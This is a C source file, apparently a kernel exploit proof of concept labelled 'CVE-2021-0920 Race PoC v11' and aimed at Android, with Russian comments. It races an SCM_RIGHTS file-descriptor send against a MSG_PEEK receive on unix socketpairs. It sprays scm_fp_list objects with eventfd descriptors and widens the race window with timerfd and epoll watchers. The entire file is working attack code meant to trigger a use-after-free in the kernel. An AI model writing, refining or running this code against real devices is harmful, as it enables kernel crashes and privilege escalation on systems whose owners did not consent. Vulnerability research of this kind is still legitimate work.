#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/epoll.h>
#include <sys/timerfd.h>
#include <sys/resource.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <sched.h>
#include <errno.h>
#include <stdbool.h>
#include <stdarg.h>

#define MAX_EPOLL_INSTANCES 50
#define MAX_DUP_FDS 20
#define SPRAY_SOCKETS 32
#define SPRAY_FDS_PER_MSG 4

volatile bool stop_race = false;
FILE* logfile = NULL;
int spray_sv[SPRAY_SOCKETS][2];
int spray_efds[SPRAY_FDS_PER_MSG];

void log_msg(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf("\n");
    
    if (logfile) {
        va_start(args, fmt);
        vfprintf(logfile, fmt, args);
        va_end(args);
        fprintf(logfile, "\n");
        fflush(logfile);
    }
}

void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
    sendmsg(socket, &msg, 0);
}

int recv_fd(int socket, int flags) {
    struct msghdr msg = {0};
    char buf[1];
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    if (recvmsg(socket, &msg, flags) < 0) return -1;
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
        int fd;
        memcpy(&fd, CMSG_DATA(cmsg), sizeof(int));
        return fd;
    }
    return -1;
}

// Спрей через SCM_RIGHTS, чтобы заполнить scm_fp_list
void* spray_thread(void* arg) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(1, &set);
    sched_setaffinity(0, sizeof(set), &set);

    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int) * SPRAY_FDS_PER_MSG)];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int) * SPRAY_FDS_PER_MSG);
    memcpy(CMSG_DATA(cmsg), spray_efds, sizeof(int) * SPRAY_FDS_PER_MSG);

    long count = 0;
    while (!stop_race) {
        for (int i = 0; i < SPRAY_SOCKETS; i++) {
            // Отправляем SCM_RIGHTS
            sendmsg(spray_sv[i][0], &msg, MSG_DONTWAIT);
        }
        count++;
        // Даем системе дышать, чтобы не вызвать Watchdog моментально
        usleep(10); 
    }
    return NULL;
}

void* setup_timer_epoll(void* arg) {
    int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
    if (tfd < 0) { log_msg("[-] timerfd_create failed"); return NULL; }

    int total_watchers = 0;
    for (int i = 0; i < MAX_EPOLL_INSTANCES; i++) {
        int epfd = epoll_create1(0);
        if (epfd < 0) break;
        for (int j = 0; j < MAX_DUP_FDS; j++) {
            int dupfd = dup(tfd);
            if (dupfd < 0) break; 
            struct epoll_event ev = { .events = EPOLLIN, .data.fd = dupfd };
            if (epoll_ctl(epfd, EPOLL_CTL_ADD, dupfd, &ev) == 0) total_watchers++;
        }
    }

    log_msg("[+] Timer/Epoll setup complete. Total watchers: %d", total_watchers);

    struct itimerspec its;
    its.it_value.tv_sec = 0;
    its.it_value.tv_nsec = 1000;
    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 1000;
    timerfd_settime(tfd, 0, &its, NULL);

    while (!stop_race) pause(); 
    return NULL;
}

void* race_thread(void* arg) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);

    long iter = 0;
    while (!stop_race) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;

        send_fd(sv[0], sv[0]);
        close(sv[0]);

        int fd = recv_fd(sv[1], MSG_PEEK);
        if (fd >= 0) {
            recv_fd(sv[1], 0);
            close(fd);
        }
        close(sv[1]);

        iter++;
        if (iter % 10000 == 0) {
            log_msg("[*] Race iterations: %ld", iter);
        }
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    logfile = fopen("/data/local/tmp/race_v11.log", "w");
    log_msg("[*] CVE-2021-0920 Race PoC v11 (SCM_RIGHTS Spray)");

    struct rlimit rlim;
    if (getrlimit(RLIMIT_NOFILE, &rlim) == 0) {
        rlim.rlim_cur = rlim.rlim_max; 
        setrlimit(RLIMIT_NOFILE, &rlim);
        log_msg("[+] FD limit set to: %ld", rlim.rlim_cur);
    }

    // Создаем eventfd для спрея
    for (int i = 0; i < SPRAY_FDS_PER_MSG; i++) {
        spray_efds[i] = eventfd(0, 0);
    }

    for (int i = 0; i < SPRAY_SOCKETS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, spray_sv[i]) < 0) return 1;
    }
    log_msg("[+] Spray sockets initialized: %d", SPRAY_SOCKETS);

    pthread_t t_setup;
    pthread_create(&t_setup, NULL, setup_timer_epoll, NULL);

    sleep(2); 

    log_msg("[*] Starting spray and race threads...");
    
    pthread_t t_spray;
    pthread_create(&t_spray, NULL, spray_thread, NULL);

    pthread_t t_race;
    pthread_create(&t_race, NULL, race_thread, NULL);

    sleep(60);
    stop_race = true;

    pthread_join(t_setup, NULL);
    pthread_join(t_spray, NULL);
    pthread_join(t_race, NULL);

    log_msg("[-] PoC finished without panic.");
    if (logfile) fclose(logfile);
    
    return 0;
}